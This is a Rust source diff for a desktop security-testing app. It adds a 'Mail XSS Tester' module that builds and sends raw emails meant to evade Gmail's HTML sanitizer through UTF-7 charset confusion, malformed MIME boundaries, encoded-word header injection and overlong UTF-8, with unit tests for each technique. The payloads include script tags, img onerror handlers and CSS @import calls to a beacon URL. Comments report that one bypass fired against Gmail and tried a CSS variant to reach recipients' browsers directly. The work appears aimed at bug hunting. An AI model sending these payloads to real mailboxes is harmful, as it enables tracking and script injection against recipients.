@@ -1412,6 +1412,144 @@ mod resolve_ip_addr_tests {
     }
 }
 
+#[cfg(test)]
+mod utf7_encode_tests {
+    use super::utf7_encode;
+
+    #[test]
+    fn direct_characters_pass_through_unchanged() {
+        // Letters, digits, and RFC 2152 Set D punctuation need no encoding.
+        assert_eq!(utf7_encode("fetch('https://x.example/a.b')"), "fetch('https://x.example/a.b')");
+    }
+
+    #[test]
+    fn angle_brackets_are_shift_encoded() {
+        // Hand-verified against RFC 2152's modified-base64 rule: U+003C/
+        // U+003E as UTF-16BE bytes (00 3C / 00 3E), base64'd without
+        // padding, wrapped in "+...-".
+        assert_eq!(utf7_encode("<"), "+ADw-");
+        assert_eq!(utf7_encode(">"), "+AD4-");
+    }
+
+    #[test]
+    fn adjacent_non_direct_characters_share_one_shift_sequence() {
+        // "{}" back-to-back should become ONE "+...-" run (two UTF-16BE
+        // code units base64'd together), not two separate shifts.
+        let encoded = utf7_encode("{}");
+        assert!(encoded.starts_with('+') && encoded.ends_with('-'));
+        assert_eq!(encoded.matches('+').count(), 1);
+    }
+
+    #[test]
+    fn full_script_tag_round_trips_through_a_real_utf7_decoder_shape() {
+        let encoded = utf7_encode("<script>a</script>");
+        assert_eq!(encoded, "+ADw-script+AD4-a+ADw-/script+AD4-");
+    }
+}
+
+#[cfg(test)]
+mod technique_message_tests {
+    use super::build_technique_message;
+
+    const FROM: &str = "tester@example.com";
+    const TO: &str = "victim@example.com";
+    const SUBJECT: &str = "Sanitization test";
+    const BEACON: &str = "https://beacon.example/hit/abc123-utf7-charset";
+
+    fn as_text(bytes: &[u8]) -> String {
+        // Lossy on purpose - overlong-utf8's message is deliberately not
+        // valid UTF-8, this is only used to eyeball headers/ASCII structure
+        // in assertions below, never to recover the exact injected bytes.
+        String::from_utf8_lossy(bytes).into_owned()
+    }
+
+    #[test]
+    fn unknown_technique_is_rejected() {
+        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "not-a-real-technique").is_err());
+    }
+
+    #[test]
+    fn utf7_charset_message_has_no_literal_angle_brackets() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "utf7-charset").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("charset=UTF-7"));
+        // The whole point: no raw '<script>' bytes anywhere in the message -
+        // only the UTF-7 shift-encoded form.
+        assert!(!text.contains("<script>"));
+        assert!(text.contains("+ADw-script+AD4-"));
+    }
+
+    #[test]
+    fn mime_boundary_desync_message_has_real_and_fake_boundary_lines() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-boundary-desync").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("multipart/alternative"));
+        assert!(text.contains("--XSSTEST_7f3a9c2b\r\n"));
+        assert!(text.contains("--XSSTEST_7f3a9c2bEXTRA_NOT_A_REAL_BOUNDARY\r\n"));
+        assert!(text.contains(BEACON));
+        assert!(text.contains("<img src="));
+    }
+
+    #[test]
+    fn mime_boundary_desync_css_message_smuggles_style_not_img() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-boundary-desync-css").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("--XSSTEST_7f3a9c2bEXTRA_NOT_A_REAL_BOUNDARY\r\n"));
+        assert!(text.contains(&format!("<style>@import \"{BEACON}\";</style>")));
+        assert!(!text.contains("<img"));
+    }
+
+    // Control pair for the two desync variants above - same 3-part
+    // multipart/alternative shape, but every boundary line is well-formed
+    // (no "EXTRA_NOT_A_REAL_BOUNDARY" junk anywhere). Confirms these two
+    // builders genuinely differ from the desync ones ONLY in that one
+    // detail, so a live A/B test against Gmail actually isolates whether
+    // the malformed boundary matters at all.
+    #[test]
+    fn mime_alternative_control_messages_have_no_malformed_boundary() {
+        let img_bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-alternative-control-img").unwrap();
+        let img_text = as_text(&img_bytes);
+        assert!(img_text.contains("multipart/alternative"));
+        assert!(!img_text.contains("EXTRA_NOT_A_REAL_BOUNDARY"));
+        assert!(img_text.contains(&format!("<img src=\"{BEACON}\" alt=\"\" />")));
+        // Every "--XSSTEST_CONTROL_9d4e1a" occurrence must be followed
+        // immediately by CRLF or "--" (the closing delimiter) - never by
+        // trailing junk - i.e. every boundary line in this message is
+        // exactly RFC 2046-valid.
+        for (idx, _) in img_text.match_indices("--XSSTEST_CONTROL_9d4e1a") {
+            let rest = &img_text[idx + "--XSSTEST_CONTROL_9d4e1a".len()..];
+            assert!(rest.starts_with("\r\n") || rest.starts_with("--"));
+        }
+
+        let css_bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-alternative-control-css").unwrap();
+        let css_text = as_text(&css_bytes);
+        assert!(css_text.contains(&format!("<style>@import \"{BEACON}\";</style>")));
+        assert!(!css_text.contains("EXTRA_NOT_A_REAL_BOUNDARY"));
+    }
+
+    #[test]
+    fn encoded_word_header_message_carries_a_base64_from_header() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "encoded-word-header").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.starts_with("From: =?UTF-8?B?"));
+        assert!(text.contains(&format!("<{FROM}>")));
+        // The injected payload must NOT appear as literal text anywhere in
+        // the header - only inside the base64 blob.
+        assert!(!text.contains("<img src=x"));
+    }
+
+    #[test]
+    fn overlong_utf8_message_contains_the_invalid_byte_sequences() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "overlong-utf8").unwrap();
+        // This message is INTENTIONALLY not valid UTF-8 - confirm the exact
+        // invalid lead/continuation byte pairs are present as raw bytes,
+        // rather than trying to treat the whole thing as a Rust &str.
+        assert!(bytes.windows(2).any(|w| w == [0xC0, 0xBC]));
+        assert!(bytes.windows(2).any(|w| w == [0xC0, 0xBE]));
+        assert!(std::str::from_utf8(&bytes).is_err());
+    }
+}
+
 #[derive(Debug, Clone, Copy, Serialize, PartialEq)]
 #[serde(rename_all = "snake_case")]
 enum EmailSourceStatus {
@@ -4634,6 +4772,267 @@ async fn send_test_email(
     Ok(())
 }
 
+// ─── Mail XSS Tester: raw-MIME encoding techniques ──────────────────────────
+// send_test_email above builds a normal, well-formed UTF-8 text/html message
+// via lettre's typed Message builder - fine for the tag/attribute-based
+// payloads in mail-xss-tester-runtime.js's PAYLOADS, but useless for testing
+// parser-differential bugs at the SMTP/MIME <-> HTML boundary (a real
+// pentester's tip after the first Mail XSS Tester finding: stop throwing
+// known payloads at Gmail - it already scans for those - and look at how
+// special characters survive the trip through charset/MIME/header decoding
+// instead). Those techniques need byte-level control lettre's typed API
+// doesn't expose (a non-UTF-8 charset declaration, a hand-picked MIME
+// boundary string repeated inside the body, invalid UTF-8 bytes), so this
+// this builds the ENTIRE raw RFC 5322 message ourselves and hands it to lettre's
+// send_raw() - the one escape hatch that sends whatever bytes it's given
+// with no reprocessing, using lettre only for the SMTP conversation itself.
+
+// RFC 2152 UTF-7: characters in Set D (letters, digits, and
+// '(),-./:? plus whitespace) are written directly; everything else is
+// UTF-16BE-encoded and wrapped in a base64 "+...-" shift sequence. Only a
+// general-enough encoder for our own fixed ASCII payload strings - not a
+// full UTF-7 codec (no support for a literal '+' needing "+-", not needed
+// here since none of our payloads contain one).
+fn utf7_encode(input: &str) -> String {
+    fn is_direct(c: char) -> bool {
+        c.is_ascii_alphanumeric() || "'(),-./:? \t\r\n".contains(c)
+    }
+
+    let chars: Vec<char> = input.chars().collect();
+    let mut out = String::new();
+    let mut i = 0;
+    while i < chars.len() {
+        if is_direct(chars[i]) {
+            out.push(chars[i]);
+            i += 1;
+            continue;
+        }
+        let mut run_bytes: Vec<u8> = Vec::new();
+        while i < chars.len() && !is_direct(chars[i]) {
+            let units: Vec<u16> = chars[i].encode_utf16(&mut [0u16; 2]).to_vec();
+            for u in units {
+                run_bytes.push((u >> 8) as u8);
+                run_bytes.push((u & 0xFF) as u8);
+            }
+            i += 1;
+        }
+        let encoded = BASE64_STANDARD.encode(&run_bytes);
+        out.push('+');
+        out.push_str(encoded.trim_end_matches('='));
+        out.push('-');
+    }
+    out
+}
+
+fn technique_message_headers(from: &str, to: &str, subject: &str) -> String {
+    format!(
+        "From: {from}\r\nTo: {to}\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\n",
+        from = from,
+        to = to,
+        subject = subject
+    )
+}
+
+// Technique 1: charset confusion. Declares the WHOLE body as UTF-7 and
+// writes the payload's '<'/'>'/'{'/'}' through utf7_encode() above (plain
+// ASCII letters/digits/URL punctuation already survive as literal Set D
+// characters) - the sanitizer would need to decode UTF-7 itself before
+// scanning for '<script>', not just pattern-match raw bytes, to catch this.
+fn build_utf7_charset_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let raw_html = format!("<script>fetch('{}').catch(function(){{}})</script>", beacon_url);
+    let body = utf7_encode(&raw_html);
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=UTF-7\r\nContent-Transfer-Encoding: 7bit\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject),
+        body = body
+    );
+    message.into_bytes()
+}
+
+// Technique 2: MIME boundary desync. A correctly-delimited multipart/
+// alternative message, but the HTML part's own content contains a SECOND
+// line starting with "--{boundary}" plus extra trailing characters - not a
+// valid boundary delimiter per RFC 2046 (trailing non-whitespace after the
+// boundary token invalidates it), so a strict parser treats it as inert
+// text. A parser that only prefix-matches "--{boundary}" instead of
+// requiring an exact line, however, would treat everything after it as a
+// brand new, never-sanitized part. Testing whether Gmail's own rendering
+// path is that lenient while whatever scans the message for known bad
+// content is strict (or vice versa).
+fn build_mime_boundary_desync_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let boundary = "XSSTEST_7f3a9c2b";
+    let message = format!(
+        "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/plain; charset=utf-8\r\n\r\n\
+         Plain-text fallback.\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\r\n\
+         <p>Normal, already-sanitized content.</p>\r\n\
+         --{boundary}EXTRA_NOT_A_REAL_BOUNDARY\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\r\n\
+         <img src=\"{beacon_url}\" alt=\"\" />\r\n\
+         --{boundary}--\r\n",
+        headers = technique_message_headers(from, to, subject),
+        boundary = boundary,
+        beacon_url = beacon_url
+    );
+    message.into_bytes()
+}
+
+// Same structural trick as build_mime_boundary_desync_message above, but
+// smuggling <style>@import> instead of <img>. Confirmed real against Gmail:
+// the plain <img> variant DID trigger, but the hit's origin IP/User-Agent
+// showed it went through Google's own GoogleImageProxy (ggpht.com) rather
+// than the recipient's browser directly - Gmail proxies image loads
+// server-side regardless of how the <img> reference got into the rendered
+// message, which blunts the IP/UA-leak impact of the underlying parser bug.
+// External CSS isn't necessarily covered by that same image-proxy layer, so
+// this variant tests whether the identical MIME-level confusion, routed
+// through a non-image tag, reaches the recipient's own browser instead.
+fn build_mime_boundary_desync_css_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let boundary = "XSSTEST_7f3a9c2b";
+    let message = format!(
+        "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/plain; charset=utf-8\r\n\r\n\
+         Plain-text fallback.\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\r\n\
+         <p>Normal, already-sanitized content.</p>\r\n\
+         --{boundary}EXTRA_NOT_A_REAL_BOUNDARY\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\r\n\
+         <style>@import \"{beacon_url}\";</style>\r\n\
+         --{boundary}--\r\n",
+        headers = technique_message_headers(from, to, subject),
+        boundary = boundary,
+        beacon_url = beacon_url
+    );
+    message.into_bytes()
+}
+
+// Control test for the two boundary-desync variants above - IDENTICAL
+// 3-part multipart/alternative structure, but with a properly-formed
+// closing boundary line for the third part instead of the deliberately
+// malformed "{boundary}EXTRA_NOT_A_REAL_BOUNDARY" one. If the beacon still
+// fires with a fully valid, spec-compliant MIME structure, that proves the
+// malformed boundary was never doing anything special - the real cause is
+// just multipart/alternative's own "render the last part the client
+// understands" rule (RFC 2046 §5.1.4), and the two desync variants above
+// aren't a parser bug at all, just an ordinary multi-alternative message.
+fn build_mime_alternative_control_message(from: &str, to: &str, subject: &str, smuggled_html: &str) -> Vec<u8> {
+    let boundary = "XSSTEST_CONTROL_9d4e1a";
+    let message = format!(
+        "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/plain; charset=utf-8\r\n\r\n\
+         Plain-text fallback.\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\r\n\
+         <p>Normal, already-sanitized content.</p>\r\n\
+         --{boundary}\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\r\n\
+         {smuggled_html}\r\n\
+         --{boundary}--\r\n",
+        headers = technique_message_headers(from, to, subject),
+        boundary = boundary,
+        smuggled_html = smuggled_html
+    );
+    message.into_bytes()
+}
+
+fn build_mime_alternative_control_img_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let html = format!("<img src=\"{}\" alt=\"\" />", beacon_url);
+    build_mime_alternative_control_message(from, to, subject, &html)
+}
+
+fn build_mime_alternative_control_css_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let html = format!("<style>@import \"{}\";</style>", beacon_url);
+    build_mime_alternative_control_message(from, to, subject, &html)
+}
+
+// Technique 3: RFC 2047 encoded-word abuse. The sender's display name is
+// almost always shown somewhere in a mail client's UI (inbox list, message
+// header) as plain decoded text - safe IF that decode step feeds a text
+// node/escaped context. Encoding an HTML-metacharacter-bearing string as a
+// base64 encoded-word tests whether Gmail's OWN decode-and-render path for
+// that specific field is one of the rare unescaped ones, independent of
+// the body's own (likely correctly sanitized) HTML sanitizer.
+fn build_encoded_word_header_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let injected = format!("<img src=x onerror=\"fetch('{}')\">", beacon_url);
+    let encoded_word = format!("=?UTF-8?B?{}?=", BASE64_STANDARD.encode(injected.as_bytes()));
+    let message = format!(
+        "From: {encoded_word} <{from}>\r\nTo: {to}\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p>Encoded-word header test - see the sender name.</p>\r\n",
+        encoded_word = encoded_word,
+        from = from,
+        to = to,
+        subject = subject
+    );
+    message.into_bytes()
+}
+
+// Technique 4: overlong UTF-8. '<' (U+003C) and '>' (U+003E) re-encoded as
+// invalid, non-canonical 2-byte sequences instead of their normal 1-byte
+// form - rejected outright by any strict, spec-compliant decoder (Rust's
+// own String type included, hence building this directly as raw bytes
+// rather than through a Rust &str), but historically some lenient decoders
+// normalized these back to the real character anyway. A legacy technique -
+// most modern engines (Gmail's web client included) are very unlikely to
+// still have this bug, but cheap enough to rule out for completeness.
+fn build_overlong_utf8_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let mut body: Vec<u8> = Vec::new();
+    body.extend_from_slice(b"<p>Overlong UTF-8 test follows:</p>");
+    body.extend_from_slice(&[0xC0, 0xBC]); // overlong '<'
+    body.extend_from_slice(b"img src=\"");
+    body.extend_from_slice(beacon_url.as_bytes());
+    body.extend_from_slice(b"\" alt=\"\"");
+    body.extend_from_slice(&[0xC0, 0xBE]); // overlong '>'
+    body.extend_from_slice(b"\r\n");
+
+    let mut message = technique_message_headers(from, to, subject).into_bytes();
+    message.extend_from_slice(b"Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n");
+    message.extend_from_slice(&body);
+    message
+}
+
+fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str, technique: &str) -> Result<Vec<u8>, String> {
+    match technique {
+        "utf7-charset" => Ok(build_utf7_charset_message(from, to, subject, beacon_url)),
+        "mime-boundary-desync" => Ok(build_mime_boundary_desync_message(from, to, subject, beacon_url)),
+        "mime-boundary-desync-css" => Ok(build_mime_boundary_desync_css_message(from, to, subject, beacon_url)),
+        "mime-alternative-control-img" => Ok(build_mime_alternative_control_img_message(from, to, subject, beacon_url)),
+        "mime-alternative-control-css" => Ok(build_mime_alternative_control_css_message(from, to, subject, beacon_url)),
+        "encoded-word-header" => Ok(build_encoded_word_header_message(from, to, subject, beacon_url)),
+        "overlong-utf8" => Ok(build_overlong_utf8_message(from, to, subject, beacon_url)),
+        other => Err(format!("Unknown technique: {other}")),
+    }
+}
+
+#[tauri::command]
+async fn send_encoding_test_email(
+    gmail_address: String,
+    app_password: String,
+    to: String,
+    subject: String,
+    beacon_url: String,
+    technique: String,
+) -> Result<(), String> {
+    let raw_message = build_technique_message(&gmail_address, &to, &subject, &beacon_url, &technique)?;
+
+    let from_addr: lettre::Address = gmail_address.parse().map_err(|e: lettre::address::AddressError| e.to_string())?;
+    let to_addr: lettre::Address = to.parse().map_err(|e: lettre::address::AddressError| e.to_string())?;
+    let envelope = lettre::address::Envelope::new(Some(from_addr), vec![to_addr]).map_err(|e| e.to_string())?;
+
+    let creds = lettre::transport::smtp::authentication::Credentials::new(gmail_address, app_password);
+    let mailer = lettre::AsyncSmtpTransport::<lettre::Tokio1Executor>::relay("smtp.gmail.com")
+        .map_err(|e| e.to_string())?
+        .credentials(creds)
+        .build();
+
+    mailer.send_raw(&envelope, &raw_message).await.map_err(|e| e.to_string())?;
+    Ok(())
+}
+
 // Browser tool "inspect network traffic" mode: the Browser tool normally
 // points its iframe straight at the target site, so - same-origin policy -
 // nothing about that page's own network activity is observable from our
@@ -5148,6 +5547,7 @@ fn main() {
             start_tunnel,
             stop_tunnel,
             send_test_email,
+            send_encoding_test_email,
             start_browser_proxy,
             stop_browser_proxy,
             get_browser_network_hits,
